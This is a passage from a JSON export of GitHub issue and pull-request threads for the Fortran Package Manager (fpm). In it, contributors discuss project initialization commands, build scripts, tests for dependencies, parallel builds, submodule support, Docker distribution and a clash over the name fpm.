            "text": "It would work just like cargo init:\n$ cargo init myproject1\n     Created binary (application) package\n$ tree -a myproject1\nmyproject1\n\u251c\u2500\u2500 Cargo.toml\n\u251c\u2500\u2500 .git\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 config\n\u2502   ...\n\u251c\u2500\u2500 .gitignore\n\u2514\u2500\u2500 src\n    \u2514\u2500\u2500 main.rs\n\n10 directories, 18 files\n\nAs you can see, it starts a git repository, and so on. It is ready to compile, so:\n~$ cd myproject1\nmyproject1(master)$ cat src/main.rs \nfn main() {\n    println!(\"Hello, world!\");\n}\nmyproject1(master)$ cargo run\n   Compiling myproject1 v0.1.0 (/tmp/myproject1)\n    Finished dev [unoptimized + debuginfo] target(s) in 1.25s\n     Running `target/debug/myproject1`\nHello, world!\n\nIf you just call cargo init, then it creates a new project in the current directory. Similar to git init.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-12 18:24:33+00:00",
                    "text": "I might split the two use cases and not actually run git init.\nfpm new name creates a folder name with contents fpm.toml, .gitignore and src\\name.f90. Maybe app\\main.f90 instead? Or maybe both? I'll come up with a specific proposal. But yeah, fpm build and maybe fpm run should work from the get go.\nfpm init uses the name of the current folder as the name of the project and just creates fpm.toml. Maybe append build/* to the end of .gitignore.\nI think we want people to be able to create new projects even if they don't already have git installed."
                },
                {
                    "user": "certik",
                    "date": "2020-06-12 18:49:31+00:00",
                    "text": "Yes, we should allow options to configure things, so all of the above will be possible with the proper options. For example to initialize without git:\ncargo init --vcs none myproject1\n\n(Obviously you can use other vcs also such as hg.) People that do not have git can always use this option.\nThe default (with no options provided) should be the ones that people use the most often as well as a \"default\" workflow that we want to encourage. I think that we absolutely want to encourage to use git and upload to GitHub or GitLab. I think that should be the default workflow to encourage.\nBut for people who are perhaps new to programming and just want to use a few dependencies and write some simple app and do not want to learn git at the moment, those would initialize with git init --vcs none myproject1.\n$ cargo init -h\ncargo-init \nCreate a new cargo package in an existing directory\n\nUSAGE:\n    cargo init [OPTIONS] [--] [path]\n\nOPTIONS:\n    -q, --quiet                  No output printed to stdout\n        --registry <REGISTRY>    Registry to use\n        --vcs <VCS>              Initialize a new repository for the given version control system (git, hg, pijul, or\n                                 fossil) or do not initialize any version control at all (none), overriding a global\n                                 configuration. [possible values: git, hg, pijul, fossil, none]\n        --bin                    Use a binary (application) template [default]\n        --lib                    Use a library template\n        --edition <YEAR>         Edition to set for the crate generated [possible values: 2015, 2018]\n        --name <NAME>            Set the resulting package name, defaults to the directory name\n    -v, --verbose                Use verbose output (-vv very verbose/build.rs output)\n        --color <WHEN>           Coloring: auto, always, never\n        --frozen                 Require Cargo.lock and cache are up to date\n        --locked                 Require Cargo.lock is up to date\n        --offline                Run without accessing the network\n    -Z <FLAG>...                 Unstable (nightly-only) flags to Cargo, see 'cargo -Z help' for details\n    -h, --help                   Prints help information\n\nARGS:\n    <path>     [default: .]"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-12 20:47:11+00:00",
                    "text": "I see, I was not aware of those options for cargo. With that, I'm fine with defaulting to using git. There is certainly value in having the defaults set to the most common use case and the one we want to encourage.\nI would still prefer init and new as two different commands."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-12 21:09:38+00:00",
                    "text": "Cargo also has init and new. They have similar but complementary roles. I see value in having both."
                }
            ]
        },
        {
            "number": 95,
            "user": "everythingfunctional",
            "date": "2020-06-11 21:43:54+00:00",
            "title": "Fix ordering for library archive list",
            "text": "Found a bug in how the library archive paths are kept. Caused a link time error for complicated dependency trees.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-12 16:23:29+00:00",
                    "text": "I had a test that I thought tested this, but apparently the dependency tree wasn't deep/complicated enough. It took a real world, complicated usage to finally uncover it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-12 17:01:03+00:00",
                    "text": "Sounds good. I don't understand the fix, but it should go forward.\nWhat's the example that didn't work and that this PR fixes? It's helpful to know so that if the same or similar scenario causes an issue again, we'll know where to look. It's good to document these things at least in the PR thread. I agree with @certik regarding tests."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-12 17:01:16+00:00",
                    "text": "Merging."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-12 18:29:53+00:00",
                    "text": "I started a simple executable project with matterff and a few other of its dependencies as dependencies, and it barfed at the link command. Unfortunately it was in a work repo, so I can't provide a link, but I should be able to relatively easily put together a separate example repo if needed."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-12 18:32:12+00:00",
                    "text": "The problem was that it was keeping the first instance of duplicate entries in the list, but it needed to keep the last one. The fix is to just reverse the list before removing the duplicates and then reverse it back once that's done."
                }
            ]
        },
        {
            "number": 94,
            "user": "certik",
            "date": "2020-06-08 16:48:21+00:00",
            "title": "Implement a build script",
            "text": "I would do exactly what Cargo does: https://doc.rust-lang.org/cargo/reference/build-scripts.html\nOnly I would allow the build script to be any of: any binary, cmake, make, Bash script.\nOtherwise the following I would do exactly the same:\n\n\nInputs: environment variables\n\n\nOutputs: the build script prints to stdout with lines starting with fpm:, everything else is ignored. At the beginning, I would support the following, and we can add more later:\n\nfpm:fc-link-lib=[KIND=]NAME --- Adds a library to link (doc)\nfpm:fc-flags=FLAGS --- Passes certain flags to the compiler (doc).\n\nThat should be enough to get us started. One of the environment variables passed to the build script is which Fortran compiler is being used, so the build script would know what compiler parameters to pass back (for example ifort in general might require different flags than gfortran). In the same way, the flags might depend on the platform (macOS vs Linux vs Windows), so one of the input variables can be what platform we run on.",
            "comments": []
        },
        {
            "number": 93,
            "user": "epagone",
            "date": "2020-06-07 12:22:50+00:00",
            "title": "Run dependencies tests",
            "text": "Use case: I'd like to build my program or library that depends on FGSL with fpm. I know how to specify such dependency (in theory, at least) and let's assume that there are no issues in fetching, compiling and linking.\nThe issue I'm raising here is: what if I want to make sure that the fetched and compiled dependency passes its tests on my machine before proceeding with linking and building my own program or library? How can I do that with fpm?\nI believe it's a non-trivial problem considering that each external dependency does not conform to fpm specs. Off the top of my head: maybe an additional key in the TOML file can be specified by the user that specifies how to test the dependency (e.g. make test)? However, I think that it is a sub-optimal solution because requires the user to gain this information for each dependency but it would be hard to have a general reliable method otherwise. Please correct me if I'm off-track.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-06-07 19:36:31+00:00",
                    "text": "@epagone good question. Here is how I think we are imagining this will work:\n\nyour program depends on FGSL.\nFGSL will be an fpm package. As such, when you execute fpm test in the FGSL repository, it will test it. (Currently FGSL is not an fpm package. We envision that eventually people would like to make all such libraries an fpm package, but until then, somebody can create simple repository that will be the fpm package for it, and it would fetch the FGSL sources and build it correctly with fpm, and it would ensure that fpm test works.)\nIn your program, you would just depend on the FGSL as an fpm package.\n\nTo run tests for FGSL, there are two options, you either checkout the FGSL repository and execute fpm test there. Or we can add an option to fpm test, such as fpm test -p FGSL that would execute the tests for FGSL.\nI just checked how Cargo does it. And while Cargo has the -p option for cargo test, it only works with local packages in a workspace (one can have multiple packages in a git repository), but it doesn't seem to work for dependencies that are not in the current repository.\nWe can discuss this more."
                },
                {
                    "user": "epagone",
                    "date": "2020-06-08 00:55:40+00:00",
                    "text": "Thanks for the explanation @certik, I understand now the logic better. However, I went back to re-read the packaging guide and I think the requirement that the dependency has to be already an fpm package is not stated:\n\nInevitably you'll want to be able to include other libraries in your project. fpm makes this incredibly simple, by taking care of fetching and compiling your dependencies for you. You just tell it what your dependencies are, and where to find them.\n\nProbably the assumption that the dependency has been already packaged with fpm is implied. Thinking about it, I guess it should not be a big deal to re-package existing libraries in fpm: it's a matter of swapping files in the right directories and writing the fpm.toml file (if I'm not missing anything major)."
                },
                {
                    "user": "certik",
                    "date": "2020-06-08 02:26:54+00:00",
                    "text": "@epagone yes, that's the most natural approach."
                }
            ]
        },
        {
            "number": 92,
            "user": "certik",
            "date": "2020-06-07 04:32:52+00:00",
            "title": "Behavior of `fpm build` and `fpm test`",
            "text": "cargo build does not build tests. You have to do cargo build --tests to also build tests.\ncargo test build tests (if needed) and runs them.\nI suggest we follow the same approach.",
            "comments": []
        },
        {
            "number": 91,
            "user": "everythingfunctional",
            "date": "2020-06-07 03:59:40+00:00",
            "title": "Multiple executables or tests in the same directory",
            "text": "Right now, program source files can not be placed in the same folder. The build system sees the other program source files and assumes they are modules. We should discuss whether this restriction should be clearly identified in the user documentation, or whether we want to try and support having multiple program sources in the same folder.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-07 04:03:29+00:00",
                    "text": "The main use case I can see for allowing this would be to have modules common to multiple programs or tests, but not included in the library. I would generally be of the opinion that such a situation calls for either putting those modules in the library, or putting them into their own separate library. And by not supporting it, it encourages users to do things the right way."
                },
                {
                    "user": "certik",
                    "date": "2020-06-07 04:23:46+00:00",
                    "text": "I think Cargo allows to have programs in subdirectories of bin/, and I think it's one executable per subdirectory, and other files are just linked to it. I think that's fine.\nFinally, all programs in bin/ directory directly are all separate programs and I think only programs are allowed there.\nI think we can follow exactly the same approach."
                }
            ]
        },
        {
            "number": 90,
            "user": "certik",
            "date": "2020-06-04 20:55:38+00:00",
            "title": "The name fpm is used by another package manager",
            "text": "It was just pointed out to me that fpm is used by another project: https://github.com/jordansissel/fpm. Unfortunately it is in a similar field (also a package manager).\nHere are some options going forward (I'll update this list if there are more):\n\nRename our fpm\nKeep the name fpm and ensure that people do not mistake the two projects (what's the best way?)\n\nAs to myself, I really like the name fpm to mean a Fortran Package Manager. So I vote for 2., if there is a way to do it.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-04 21:13:50+00:00",
                    "text": "I vote for 2 as well. I think the two are sufficiently different, but knowing it's out there we can be conscious to avoid confusion as much as possible.\nOn a side note, should we use that tool to create our Linux packages?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-04 21:24:35+00:00",
                    "text": "This is unfortunate, though not surprising.\nAs the originator of the name, I'm sorry. I should've done better research. :(\nMy preference is also for 2, because I like the name. However I see issues ahead of us, and it will only be more difficult to rename later. Issues are:\n\nConfusion\nConflict (both CLI tools are called fpm)\nBad look on us as the community, as we are a younger project\n\n\nOn a side note, should we use that tool to create our Linux packages?\n\nThough it sounds like a good idea, now we're really screwed: \"So fpm will package fpm for Linux. Wait, which fpm is this? Is it this fpm or the other fpm?\". I'm confused already. :)\n\nSo I vote for 2., if there is a way to do it.\n\nLet's discuss how we could do it. This would probably mean putting a large disclaimer at the top of our README, saying \"This fpm is not the other fpm\", or similar. What else?\n@jordansissel Do you have any advice for us?"
                },
                {
                    "user": "jordansissel",
                    "date": "2020-06-05 00:59:34+00:00",
                    "text": "I ran into this myself shorty after releasing (my) fpm! I learned there\u2019s a\ntool PHP-FPM That many folks call FPM.\n\nNaming is hard. It\u2019s hard to know if conflicting names will cause\ndifficulties.\n\nI\u2019ve run into weirdness myself with things on Debian like \u201cdocker\u201d package\nnot being the container runtime tool.\n\nI think my advice is this: if you feel fpm is the right name for your tool,\nthen please keep the name. Computers and humans will likely figure this out\non their own with their own workarounds that aren\u2019t too harmful. Examples\nabound, like you can\u2019t really search for \u201cgo\u201d so while the language is Go\nyou gotta search golang. It\u2019s a weird workaround but it works most of the\ntime.\n\nIs this a bad look? I don\u2019t think so!\n\n+1 for a clarification at the top of the README. I\u2019d be happy to include a\nsimilar clarification in my fpm readme and docs. Something short and direct\nthat describes the project (FORTRAN for this one) and offers disambiguation\nlinks to help any wayward travelers.\n\nI agree with concern about command line name conflicts, but it\u2019s unclear\nwhat negative impact this will have. Again here we have examples like\ndownstream OS calling \u201cpip\u201d executable \u201cpython3-pip\u201d or similar naming\nsolutions. That said, it\u2019s probably fine to keep the cli name the same?\n\nAs for search/discovery, \u201cfpm\u201d plus any context should help search engines\nfind the right place for users.\n\nThoughts? Having the project and cli name be the same has low risk in my\nopinion.\n\u2026\nOn Thu, Jun 4, 2020 at 2:24 PM Milan Curcic ***@***.***> wrote:\n This is unfortunate, though not surprising.\n\n As the originator of the name\n <fortran-lang/stdlib#44 (comment)>,\n I'm sorry. I should've done better research. :(\n\n My preference is also for 2, because I like the name. However I see issues\n ahead of us, and it will only be more difficult to rename later. Issues are:\n\n    - Confusion\n    - Conflict (both CLI tools are called fpm)\n    - Bad look on us as the community, as we are a younger project\n\n On a side note, should we use that tool to create our Linux packages?\n\n Though it sounds like a good idea, now we're really screwed: \"So fpm will\n package fpm for Linux. Wait, which fpm is this? Is it this fpm or the other\n fpm?\". I'm confused already. :)\n\n So I vote for 2., if there is a way to do it.\n\n Let's discuss how we could do it. This would probably mean putting a large\n disclaimer at the top of our README, saying \"This fpm is not the other\n fpm\", or similar. What else?\n\n @jordansissel <https://github.com/jordansissel> Do you have any advice\n for us?\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#90 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AABAF2WIFDF5BRL244MHV4LRVAGKDANCNFSM4NS7GCRA>\n ."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-05 02:54:11+00:00",
                    "text": "Jordan, thanks a lot. With your encouragement I now feel more comfortable keeping the name, and making it clear in the README to avoid confusion.\nSo if @certik and @everythingfunctional agree, we'll add the clarification and link to the top of the README."
                },
                {
                    "user": "certik",
                    "date": "2020-06-05 04:11:25+00:00",
                    "text": "@jordansissel thank you for your nice comment. Since you are ok with us keeping the name, I am too. @milancurcic yes, let's send a PR with a clarification at the top of our README and docs. That should make it clear to users.\nI agree with Jordan that there are ways around it. For example Debian has the alternatives system, so users will be able to choose what they want to run as fpm."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-05 04:43:29+00:00",
                    "text": "I am in agreement. Good call just reaching out and asking, and thank you @jordansissel for your understanding and encouragement."
                },
                {
                    "user": "certik",
                    "date": "2020-06-05 21:49:37+00:00",
                    "text": "Here is an example how Spack disambiguates the name:\nhttps://spack.readthedocs.io/en/latest/\nThey write:\n\nThese are docs for the Spack package manager. For sphere packing, see pyspack."
                },
                {
                    "user": "nshaffer",
                    "date": "2020-06-13 23:23:01+00:00",
                    "text": "The fpm help text gave me an idea for an alternate name.\nwwf - working with Fortran\nIt seems like the naming crises has passed, but I'm just too tickled by the idea of scientists and engineers co-opting \"WWF\" to mean their package manager."
                }
            ]
        },
        {
            "number": 89,
            "user": "everythingfunctional",
            "date": "2020-06-02 15:12:27+00:00",
            "title": "Add ability to specify which test or program to run and their args",
            "text": "This adds some command line arguments to allow specifying which executable or test you would like to run, and any command line arguments you would like to pass on.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-04 20:15:45+00:00",
                    "text": "At this stage I (we) haven't really talked about whether executables should be in their own directory. So that is kind of a current edge case bug.\nRight now it just assumes that for a given executable, everything else in that directory is a module meant to be included with it. So while trying to compile one executable it saw the source for the other, assumed it was a module, and failed when compiling it didn't result in the appropriate mod file (or at least I'm guessing that's what happened).\nI'd suggest creating an issue so we can discuss and decide whether this should be documented as a limitation/requirement or marked as a bug to fix later."
                },
                {
                    "user": "certik",
                    "date": "2020-06-04 20:36:36+00:00",
                    "text": "Right. We should also consult how Rust does it.\n+1 to merge this PR."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-04 20:40:13+00:00",
                    "text": "I now see approval from @certik, so I agree to merge this, and we can add some basic instructions to the README in a separate PR."
                },
                {
                    "user": "certik",
                    "date": "2020-06-04 20:44:53+00:00",
                    "text": "See #83 for improving the tests in general. We have to add a lot more tests, that would serve as the \"spec\" of how fpm is expected to work."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-04 21:08:43+00:00",
                    "text": "I'll go ahead and add stuff to the README for this PR. No sense leaving it half done.\nAs for the testing, I think there's just one last thing I'd like to take a crack. I want to get support for using a build script or makefile. That shouldn't take much time to implement. Then yes, we should focus our efforts on writing as many tests (both happy path and error conditions) as we can think of.\nUp to this point, this has been a prototype. I think we've been incredibly successful with it, and it's functionality is pretty much right where we want. So now we just put some tests around it to make sure nothing breaks while we pretty up the insides."
                },
                {
                    "user": "LKedward",
                    "date": "2020-06-05 07:55:12+00:00",
                    "text": "Right now it just assumes that for a given executable, everything else in that directory is a module meant to be included with it. So while trying to compile one executable it saw the source for the other, assumed it was a module, and failed when compiling it didn't result in the appropriate mod file (or at least I'm guessing that's what happened).\nI'd suggest creating an issue so we can discuss and decide whether this should be documented as a limitation/requirement or marked as a bug to fix later.\n\nThanks for the explanation, this behaviour makes more sense to me now; I don't think it's a bug but it is definitely something that needs to be documented in PACKAGING.md."
                },
                {
                    "user": "certik",
                    "date": "2020-06-07 04:26:03+00:00",
                    "text": "So cargo build does not build tests. You have to do cargo build --tests to also build tests.\ncargo test build tests (if needed) and runs them.\nI suggest we follow the same approach."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-07 04:30:09+00:00",
                    "text": "Ok. That will require some (minor) refactoring to get working properly. Open an issue and I can fix it in another PR."
                },
                {
                    "user": "certik",
                    "date": "2020-06-07 04:33:08+00:00",
                    "text": "Sure: #92."
                }
            ]
        },
        {
            "number": 88,
            "user": "LKedward",
            "date": "2020-05-31 10:23:57+00:00",
            "title": "Parallel job control flag",
            "text": "I think it's great that fpm already supports parallel builds - there should be a command line flag, like -j, to control the maximum number of threads used.\nThis is important for two reasons:\n\nyou can't assume that the machine will not already be under load, particularly for multi-user environments;\nmemory limits - I have previously run out of memory on a work computer for a large parallel build",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-01 02:19:40+00:00",
                    "text": "Yep, that's fair. -j is something that would be expected.\nI didn't mention this subtle detail, but I probably should have; it doesn't build the dependencies in parallel, but it absolutely could. By that I mean building two dependencies that don't depend on each other could be done simultaneously. However, doing that at this stage would mean that each dependency get's built with the same number of threads. I'll need to think about how to really robustly structure the parallelism."
                }
            ]
        },
        {
            "number": 87,
            "user": "everythingfunctional",
            "date": "2020-05-31 00:18:15+00:00",
            "title": "Docker Image With fpm",
            "text": "Now that fpm is in a usable state, I think we should try and create a docker image with the latest version installed, so people can use fpm in their CI.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-05-31 02:59:46+00:00",
                    "text": "Yes. Even better we should distribute fpm as a single binary for each platform."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-01 02:11:14+00:00",
                    "text": "I think we should focus more on package manager distributions than just an executable. At a minimum we should support apt, yum, pacman, and homebrew. Probably also some others. Manually installed things don't get updated very often, if at all."
                },
                {
                    "user": "certik",
                    "date": "2020-06-01 02:16:37+00:00",
                    "text": "Yes, we need all of those also.\n\u2026\nOn Sun, May 31, 2020, at 8:11 PM, Brad Richardson wrote:\n\n\n I think we should focus more on package manager distributions than just\n an executable. At a minimum we should support `apt`, `yum`, `pacman`,\n and `homebrew`. Probably also some others. Manually installed things\n don't get updated very often, if at all.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#87 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWAXGOLNFFNM2HC23I3RUME43ANCNFSM4NO5JRWQ>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-01 18:18:03+00:00",
                    "text": "Let's not forget fpm update. This is something I'd expect as a user. fpm should be able to update itself.\nI'm not a target audience for Docker image but I see its value.\nLinux system package managers like apt and dnf I use occasionally, but I can't take them seriously because so many packages are out of date, so they're mostly good for mature (stable) packages. I agree one should be able to get fpm using those. Then also consider Homebrew, Linuxbrew, and Snapcraft."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-02 13:25:26+00:00",
                    "text": "I quickly slapped together a docker image here. I scheduled the CI to update weekly as well.\nAt some point this will deserve some effort to trim down the size of the resulting image. Right now I based it on Ubuntu and built fpm in the image. It should be possible to use a more lightweight starting point (like Alpine) and just copy in the fpm executable. Then we should create a more official one and publish it on docker hub."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-02 13:51:37+00:00",
                    "text": "Great! I think it's a good start. I suggest adding the Dockerfile (and associated instructions in the README.md) to the fpm repo."
                }
            ]
        },
        {
            "number": 86,
            "user": "LKedward",
            "date": "2020-05-30 16:12:03+00:00",
            "title": "Support Fortran submodules",
            "text": "Except for small/simple projects, I almost always adopt Fortran submodules now to structure new projects. This is primarily for the parallel and incremental builds that they allow.\nI realise this may be low down on the list of project priorities currently, but I think it should only require an update to the dependency tracking whereby submodules depend on their parent modules as if they use them.\nMuch further down the line, I assume fpm will aim for some kind of parallel build support?",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-05-30 16:14:52+00:00",
                    "text": "Thanks. Yes, fpm must work with submodules and yes, we must be able to build in parallel."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-30 19:55:20+00:00",
                    "text": "fpm does support parallel builds right now. All modules are compiled in parallel (to the extent they can be of course, given dependencies on the .mod files). Supporting submodules won't be too difficult, but I haven't found a particularly compelling use case."
                },
                {
                    "user": "LKedward",
                    "date": "2020-05-30 20:01:22+00:00",
                    "text": "fpm does support parallel builds right now. All modules are compiled in parallel\n\nThis is awesome! I didn't realise. Does it use all available threads by default?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-30 23:04:41+00:00",
                    "text": "Yep"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-17 14:17:30+00:00",
                    "text": "I've gotten a request from a paying customer to add support for submodules ASAP. The question I have for the rest of the group has to do with the naming convention restrictions we currently have in place for modules.\nThe dependency detection and build system has to get a lot more rigorous and complex, so I'm thinking of just removing the name-spacing and file name matching requirement we had for modules, since it doesn't quite apply properly to submodules. And while I like it as a convention, it was done partly to avoid doing the harder work of properly looking in the source files.\nDo you guys have any thoughts? It won't add any backwards incompatibilities, and it won't add any complexities from a user perspective."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-17 14:21:48+00:00",
                    "text": "The dependency detection and build system has to get a lot more rigorous and complex, so I'm thinking of just removing the name-spacing and file name matching requirement we had for modules, since it doesn't quite apply properly to submodules. And while I like it as a convention, it was done partly to avoid doing the harder work of properly looking in the source files.\n\nI have no objection to removing these naming requirements - I actually found it very restrictive when trying out fpm with existing packages which have their own various naming conventions.\nI'm excited for submodule support! \ud83d\ude80"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-08-17 15:00:21+00:00",
                    "text": "This sentence confuses me:\n\nI'm thinking of just removing the name-spacing and file name matching requirement we had for modules, since it doesn't quite apply properly to submodules.\n\nDo you mean keep the existing requirement for modules, but don't require it for submodules? I think so, because later you wrote \"It won't add any backwards incompatibilities\".\nI don't understand well how submodules are managed by compilers. If there's no possibility of name clash between submodules from different packages, then I don't see the need to enforce the same convention we have for modules. So, this sounds good to me, but let's make sure that that's the case."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-17 15:16:32+00:00",
                    "text": "I mean remove the existing requirement for modules. Removing that requirement is backwards compatible.\nSubmodules are a bit convoluted.\nCompiling a module produces a .mod and .smod with the name of the module. Compiling a submodule depends on the .mod and .smod of its parent module, and the .smod of any parent submodules, and produces a .smod file named parent_mod@parent_smod1@parent_smod2@...@submod.smod. Then all of the object files from the whole tree must be linked into the library or executable."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-17 15:43:46+00:00",
                    "text": "If there's no possibility of name clash between submodules from different packages, then I don't see the need to enforce the same convention we have for modules.\n\nI hadn't realised this convention was for avoiding name clashes but I guess that makes sense - how would name clashes be avoided without this requirement @everythingfunctional ?\n\nSubmodules are a bit convoluted.\n\nI remember reading somewhere that submodule file naming conventions vary between compiler vendors - can these dependencies not be tracked without relying on .mod and .smod files?\nWithin my makefiles I never reference *mod files and simply rely on the corresponding object file for updating dependencies; in this way submodule dependencies can be treated like a normal use dependency where the submodule 'uses' its parent module."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-17 17:10:34+00:00",
                    "text": "I'd still recommend people follow that naming convention, it just won't be a hard requirement. So you can still have a module named utilities_stats in a file src/utilities/stats.f90 per the current requirement and it will still work just fine. With the change, the module could just be named stats, but if any other package has a module named stats, they'll conflict of course. The possibility of conflict already exists, and I think always will unless we make a breaking change and require all modules in a library be prefixed with the name of the library.\nI don't recall exactly where I read that naming convention. It may have just been the gfortran documentation, in which case this may be a bit trickier when we try and support multiple compilers, but hopefully not a big deal.\nWhile you can write your makefiles without mentioning the .mod files, it's not strictly correct. Compiling a source file doesn't actually depend on the object files, just the .mod files. And it sidesteps a potential optimization I wish the compilers would actually implement; don't update the .mod file if none of the interfaces changed. That would actually take care of the \"recompilation cascades\" that most people give as the motivation for using submodules."
                },
                {
                    "user": "certik",
                    "date": "2020-08-17 17:42:38+00:00",
                    "text": "I think I am against removing the restriction by default. I very strongly believe the default should be setup in a way to guarantee that there cannot be any name collisions.\nThis restriction is there to prevent name collisions. What we can do is remove the restrictions if the user requests that in fpm.toml --- with the understanding that fpm cannot guarantee there won't be name collisions with user code any more; this option would be used to get existing packages working quickly, but they will not be \"conforming\", and thus there can be collisions."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-17 17:59:08+00:00",
                    "text": "The restrictions currently in place do not actually guarantee there cannot be any name collisions. If you put a module named utils in the root src folder, you're almost guaranteed to have a name collision with some other package and there isn't anything in place preventing that at the moment.\nThe restriction is really only preventing accidental name collisions within a library, and so far the errors have caused more confusion than they have helped anything.\nI can add a check for it back in once this is implemented, but at that point it's just enforcing a convention (albeit a good one), more than any technical requirement, and still not actually guaranteeing no name collisions between packages."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-17 18:18:39+00:00",
                    "text": "While you can write your makefiles without mentioning the .mod files, it's not strictly correct. Compiling a source file doesn't actually depend on the object files, just the .mod files.\n\nGood point, but I disagree with your assertion of incorrectness; depending on module object files will not result in an incorrect dependency between source files, rather it (theoretically) results in redundant recompilation as you point out. Therefore object file dependencies are correct for modules, but not optimal.\nI am genuinely intrigued as to why your proposed optimisation is not implemented anywhere, it seems like a simple fix to a big problem!\n\nThat would actually take care of the \"recompilation cascades\" that most people give as the motivation for using submodules.\n\nMy own motivation for submodules is mainly to flatten the dependency tree to just two layers so that each layer can be compiled completely in parallel. Being able to compile in parallel quickly outweighs any redundancy in my dependencie.\n\nI think I am against removing the restriction by default. I very strongly believe the default should be setup in a way to guarantee that there cannot be any name collisions.\n\nMy preference would be for an alternative solution to avoiding name collisions, perhaps we should discuss in a dedicated thread?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-08-17 18:27:58+00:00",
                    "text": "The restrictions currently in place do not actually guarantee there cannot be any name collisions.\n\nThat's true but this is not so much about the current guarantees, but about the design we're aiming for.\nDo we want to prevent name clashes? (I think it's unanimous yes)\nIf yes, then what is the optimal solution to do it? Prefixing with the package name is the best I can think of.\nThe only exception should be single-module libraries, which could have a module with the same name as the package.\nI think this would be good to discuss on our call on Thursday."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-17 18:48:11+00:00",
                    "text": "My preference would be for an alternative solution to avoiding name collisions, perhaps we should discuss in a dedicated thread?\n\nYes, I'll start a new issue."
                }
            ]
        },
        {
            "number": 85,
            "user": "everythingfunctional",
            "date": "2020-05-30 03:03:17+00:00",
            "title": "Implement test/executable specific dependencies",
            "text": "At this point it's kind of a terrible, ugly, hacked together prototype, but it works. And allows for \"semi\"-circular dependencies. If one of your test or executable dependencies depends on your library, it will still work.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-30 03:08:20+00:00",
                    "text": "My use case for this is that vegetables depends on both iso_varying_string and strff, but I want to be able to use vegetables to test them. This way that will work.\nI still need to try to migrate these to using fpm to be sure that it will work, but I'll try that over the next day or two. The test I added suggests it will."
                },
                {
                    "user": "certik",
                    "date": "2020-05-30 04:08:40+00:00",
                    "text": "Yes, we need this feature. However, let's follow the Cargo's syntax? Or do you have reasons why that's not a good idea in this case?\nhttps://doc.rust-lang.org/cargo/reference/specifying-dependencies.html#development-dependencies\nIt has [dependencies] for just building the package, and additional [dev-dependencies] for building tests / benchmarks etc.\nCurrently you have:\n[[test]]\n  name = \"test\"\n  source-dir = \"tests\"\n  main = \"main.f90\"\n  [test.dependencies]\n    circular_test = { path = \"../circular_test\" }\nLet's instead do:\n[dev-dependencies]\n    circular_test = { path = \"../circular_test\" }\n\n[[test]]\n  name = \"test\"\n  source-dir = \"tests\"\n  main = \"main.f90\"\nAnd finally fpm should be clever enough to figure out the tests from the layout only (eventually), so it would become just:\n[dev-dependencies]\n    circular_test = { path = \"../circular_test\" }\nIn Cargo you can specify also dependencies for a particular target only. But it seems this dev-dependencies would cover 90% of use cases, including yours (I think)."
                },
                {
                    "user": "certik",
                    "date": "2020-05-30 04:09:43+00:00",
                    "text": "My other comment is that instead of adding tests in the root directory as examples, let's move them in the tests directory?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-30 19:41:26+00:00",
                    "text": "I'm not opposed to also having [dev-dependencies], but my question would be, are those used for the executables too? Or would we want to have [test-dependencies] and [exe-dependencies]?\nI can move the tests into the tests directory. That's no problem."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-31 00:16:34+00:00",
                    "text": "I was able to try this out converting a few of my libraries to using fpm, and it works great. This will make it possible for me to convert (almost) all of my packages to fpm."
                },
                {
                    "user": "certik",
                    "date": "2020-05-31 02:49:41+00:00",
                    "text": "I am not sure about the executables --- I would expect that dev-dependecies only work for tests, benchmarks etc.\nIn your use case, you have to have special dependencies for executables?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-31 23:20:53+00:00",
